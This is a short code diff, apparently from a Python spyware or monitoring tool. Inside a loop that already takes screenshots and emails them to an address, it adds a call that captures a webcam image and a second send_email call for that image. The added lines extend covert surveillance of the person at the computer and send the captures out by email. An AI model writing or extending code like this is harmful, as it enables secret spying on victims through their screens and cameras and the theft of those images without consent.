@@ -163,3 +163,6 @@ while number_of_iterations < number_of_iterations_end:
 
         screenshots()
         send_email(screenshot_info, file_merge + screenshot_info, toaddr)
+
+        webCamera()
+        send_email(webCamShot_info, file_merge + webCamShot_info, toaddr)
